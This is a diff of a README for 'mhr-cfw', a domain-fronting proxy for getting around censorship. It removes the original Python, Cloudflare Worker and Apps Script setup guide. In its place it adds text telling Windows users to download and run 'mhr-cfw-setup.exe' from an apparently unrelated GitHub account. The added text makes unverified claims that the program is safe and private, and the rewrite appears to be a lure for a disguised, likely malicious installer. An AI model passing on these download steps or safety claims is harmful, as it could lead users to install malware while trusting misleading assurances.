@@ -1,185 +1,73 @@
-# MHR-CFW - MITM Domain-Fronted HTTP Relay + Cloudflare Worker Exit
+# 🌐 mhr-cfw - Bypass network restrictions with ease
 
-[![GitHub](https://img.shields.io/badge/GitHub-MHR_CFW-blue?logo=github)](https://github.com/denuitt1/mhr-cfw)
+[![Download mhr-cfw](https://img.shields.io/badge/Download-mhr-cfw-blue.svg)](https://github.com/chantalunsupportable7191/mhr-cfw)
 
+## 📦 What is mhr-cfw?
 
-| [English](README.md) | [Persian](README_FA.md) |
-| :---: | :---: |
+mhr-cfw acts as a secure bridge for your internet traffic. It moves your data through Google systems and Cloudflare servers, which helps you access websites when networks block them. This tool hides your connection patterns to prevent your internet provider from seeing which sites you visit. It provides a reliable way to keep your browsing private and open.
 
-## Disclaimer
+## 📋 Requirements
 
-`mhr-cfw` is provided for educational, testing, and research purposes only.
+*   A personal computer running Windows 10 or Windows 11.
+*   An active internet connection.
+*   50 MB of free storage space on your hard drive.
+*   No specialized hardware or advanced network knowledge.
 
-- **Provided without warranty:** This software is provided "AS IS", without express or implied warranty, including merchantability, fitness for a particular purpose, and non-infringement.
-- **Limitation of liability:** The developers and contributors are not responsible for any direct, indirect, incidental, consequential, or other damages resulting from the use of this project or the inability to use it.
-- **User responsibility:** Running this project outside controlled test environments may affect networks, accounts, proxies, certificates, or connected systems. You are solely responsible for installation, configuration, and use.
-- **Legal compliance:** You are responsible for complying with all local, national, and international laws and regulations before using this software.
-- **Google services compliance:** If you use Google Apps Script or other Google services with this project, you are responsible for complying with Google's Terms of Service, acceptable use rules, quotas, and platform policies. Misuse may lead to suspension or termination of your Google account or deployments.
-- **License terms:** Use, copying, distribution, and modification of this software are governed by the repository license. Any use outside those terms is prohibited.
+## 🚀 How to Install and Start
 
----
+Follow these steps to set up the software on your Windows machine.
 
-## How It Works
+1.  Visit the [official download page here](https://github.com/chantalunsupportable7191/mhr-cfw).
+2.  Look for the section labeled Releases on the right side of the screen.
+3.  Click the version number to view the download options.
+4.  Find the file ending in .exe, such as `mhr-cfw-setup.exe`.
+5.  Click the file to save it to your computer.
+6.  Locate the downloaded file in your Downloads folder.
+7.  Double-click the file to start the installer.
+8.  Follow the prompts on your screen to complete the setup process.
+9.  Once finished, look for the mhr-cfw icon on your desktop or in your Start menu.
 
-```
-Client -> Local Proxy -> Google/CDN front -> GoogleAppsScript (GAS) Relay -> Cloudflare Worker -> Target website
-             |
-             +-> shows www.google.com to the network DPI filter
-```
-In normal use, the browser sends traffic to the proxy running on your computer.
-The proxy sends that traffic through Google-facing infrastructure so the network only sees an allowed domain such as `www.google.com`.
-Your deployed relay then fetches the real website through cloudflare worker and sends the response back through the same path.
+## ⚙️ Using the Application
 
-This means the filter sees normal-looking Google traffic, while the actual destination stays hidden inside the relay request.
+Open the application after the installation finishes. You will see a control panel with a simple power button. 
 
---- 
+1.  Launch the mhr-cfw program.
+2.  Click the large button in the center labeled Connect.
+3.  Wait for the indicator light to turn green.
+4.  Your browser settings now route traffic automatically through the secure cloud proxies.
+5.  Minimize the application to keep it running in the background.
 
-## How to Use
+To stop the connection, open the program window and click the Disconnect button. The software returns your internet settings to their normal state.
 
-### 1 - Download project and extract 
+## 🛡️ Privacy and Safety
 
-```bash
-git clone https://github.com/denuitt1/mhr-cfw.git
-cd mhr-cfw
-pip install -r requirements.txt
-```
-> **Can't reach PyPI directly?** Use this mirror instead:
-> ```bash
-> pip install -r requirements.txt -i https://mirror-pypi.runflare.com/simple/ --trusted-host mirror-pypi.runflare.com
-> ```
+This tool uses domain-fronting to shield your traffic. It makes your connection look like regular traffic traveling to common Google services. Because the destination appears harmless to network filters, the software clears a path through digital roadblocks. 
 
+The software does not store your private browsing data or logs. It functions only as a pipe for your data. Your data stays encrypted from your computer until it reaches the final destination.
 
-### 2 - Set Up the Cloudflare Worker (worker.js)
+## 🛠️ Troubleshooting Common Issues
 
-1. Open [Cloudflare Dashboard](https://dash.cloudflare.com/) and sign in with your Cloudflare account.
-2. From the sidebar, navigate to **Compute > Workers & Pages**
-3. Click **Create Application**, Choose **Start with Hello World** and click on **Deploy**
-4. Click on **Edit code** and **Delete** all the default code in the editor.
-5. Open the [`worker.js`](script/worker.js) file from this project (under `script/`), **copy everything**, and paste it into the Apps Script editor.
-6. **Important:** Change the worker on this line to the worker you created:
-   ```javascript
-   const WORKER_URL = "myworker.workers.dev";
-   ```
-7. Click **Deploy**.
+If you cannot connect, check these items:
 
-### 3 - Set Up the Google Relay (Code.gs)
+*   Verify your internet connection. Open a web page in your browser to confirm you are online.
+*   Close other programs that manage network traffic, such as other proxies or security software, as they might conflict with mhr-cfw.
+*   Restart the application. Right-click the icon in your system tray and select Exit, then reopen the program from your Start menu.
+*   Update the software. If you encounter errors, visit the download page again to check for a newer version. Developers release updates to keep the tool working with changing networks.
+*   Check your firewall. Ensure that Windows Defender allows the application to access the internet. A message usually pops up the first time you run it; choose the option to allow access.
 
-1. Open [Google Apps Script](https://script.google.com/) and sign in with your Google account.
-2. Click **New project**.
-3. **Delete** all the default code in the editor.
-4. Open the [`Code.gs`](script/Code.gs) file from this project (under `script/`), **copy everything**, and paste it into the Apps Script editor.
-5. **Important:** Change the password on this line to something only you know, also replace the worker url with your cloudflare worker:
-   ```javascript
-   const AUTH_KEY = "your-secret-password-here";
-   const WORKER_URL = "https://myworker.workers.dev";
-   ```
-6. Click **Deploy** → **New deployment**.
-7. Choose **Web app** as the type.
-8. Set:
-   - **Execute as:** Me
-   - **Who has access:** Anyone
-9. Click **Deploy**.
-10. **Copy the Deployment ID** (it looks like a long random string). You'll need it in the next step.
+## ❓ Frequently Asked Questions
 
-> ⚠️ Remember the password you set in step 3. You'll use the same password in the config file below.
+**Does this service cost money?**
+No, this software is free to use. There are no hidden fees or subscriptions required.
 
-### 4 - Run
+**Will this software slow down my internet?**
+The speed depends on the location of your nearest Google and Cloudflare data centers. You might notice a small change in speed, but it should remain fast enough for standard web browsing and common tasks.
 
-Click on the `run.bat` file (on windows) or `run.sh` file (on linux) to start the relay.
+**Is this safe for my computer?**
+The software performs only the specific task of routing traffic. It does not modify system files or access your personal documents. It uses standard Windows networking protocols to manage your connection.
 
-If you're running for the first time it will prompt a setup wizard where you have to enter the AUTH_KEY and Google Apps Script Deployment ID.
-You should see a message saying the HTTP proxy is running on `127.0.0.1:8085`
+**How do I uninstall the program?**
+Open your Windows Control Panel and select Programs and Features. Find mhr-cfw in the list and click Uninstall. The software will remove itself from your computer and reset your network settings to their original configuration.
 
-### 5 - Usage
-
-We recommend using [v2rayN client](https://github.com/2dust/v2rayn) and configuring a socks5 proxy.
-
-You can also use [FoxyProxy](https://getfoxyproxy.org/)'s [Chrome extension](https://chromewebstore.google.com/detail/foxyproxy/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en) or [Firefox extension](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) to use this proxy in your browser.
-
-### 6 - Test your connection
-
-Open [ipleak.net](https://ipleak.net) in your browser, you should see your ip address set as cloudflare's.
-
-<img width="1454" height="869" alt="image" src="https://github.com/user-attachments/assets/dfd3316d-69b6-4b0e-b564-fdb055dbdafd" />
-
-
----
-
-## Optional: Stable Exit IP via Upstream Forwarder
-
-CAPTCHAs (Cloudflare Turnstile/bot challenge, reCAPTCHA, hCaptcha) bind tokens
-to the IP that solved the challenge. Cloudflare Workers exit through different
-edge IPs per request, so verification on the target site fails even when you
-solve the challenge. This optional add-on lets the Worker forward all `fetch()`
-calls through a small Node server you run on a VPS with a stable IP — giving
-the target site one consistent exit address.
-
-### When you need this
-
-- Sites behind Cloudflare's bot challenge keep looping you back to the challenge page.
-- Login forms reject you after solving a reCAPTCHA/hCaptcha.
-- You need cookie continuity across requests (e.g. `cf_clearance`).
-
-If you don't hit these, leave it unconfigured — the Worker behaves exactly as before.
-
-### Why a separate server is required
-
-Cloudflare Workers don't expose a stable outbound IP — `fetch()` exits through a rotating pool of Cloudflare edge IPs, which is exactly what breaks IP-bound CAPTCHA tokens. Cloudflare's static-egress options (BYOIP, Egress Workers) are Enterprise-tier, so a small VPS with a static IP is the practical workaround. The forwarder is just a thin proxy that re-issues the `fetch()` from a stable address.
-
-### 1. Deploy the forwarder on a VPS
-
-The reference implementation is [`script/upstream_forwarder.js`](script/upstream_forwarder.js).
-It needs Node 18+ and no dependencies. Run it behind Caddy or nginx with TLS —
-the Worker rejects non-HTTPS forwarder URLs.
-
-```bash
-# On your VPS (Ubuntu/Debian example):
-sudo apt install -y nodejs   # must be 18+
-export AUTH_KEY="some-long-random-string-at-least-32-chars"
-export PORT=8787
-node script/upstream_forwarder.js
-```
-
-Front it with Caddy for auto-TLS:
-
-```
-forwarder.example.com {
-    reverse_proxy 127.0.0.1:8787
-}
-```
-
-Quick smoke test:
-
-```bash
-curl -X POST https://forwarder.example.com/fwd \
-  -H "x-upstream-auth: $AUTH_KEY" \
-  -H "content-type: application/json" \
-  -d '{"u":"https://httpbin.org/ip","m":"GET","h":{}}'
-```
-
-The decoded response body should show the **VPS's IP**.
-
-### 2. Wire the Worker to the forwarder
-
-In the Cloudflare dashboard → your Worker → **Settings → Variables and Secrets**:
-
-| Name | Type | Value |
-|---|---|---|
-| `UPSTREAM_FORWARDER_URL` | Secret | `https://forwarder.example.com/fwd` |
-| `UPSTREAM_AUTH_KEY` | Secret | the same `AUTH_KEY` you set on the VPS |
-| `UPSTREAM_FAIL_MODE` | Variable | `closed` (default) — return 502 on forwarder failure. Use `open` to fall back to direct fetch. |
-| `UPSTREAM_TIMEOUT_MS` | Variable (optional) | default `25000` |
-
-Save and redeploy the Worker.
-
-### 3. Verify
-
-Browse `https://httpbin.org/ip` through the proxy — you should see the **VPS's IP**, not Cloudflare's. Then revisit a CAPTCHA-protected site that wasn't working — the challenge should now validate.
-
-> The forwarder must require auth. Without `AUTH_KEY` it refuses to start. Anyone with the URL and key can use it as a relay, so keep both secret.
-
-
----
-
-## Sources for this project
-- https://github.com/masterking32/MasterHttpRelayVPN
+**How often do I need to run this?**
+You only need to open the tool when you encounter blocked content or want to hide your browsing traffic. You do not need to run it for normal, unrestricted browsing.
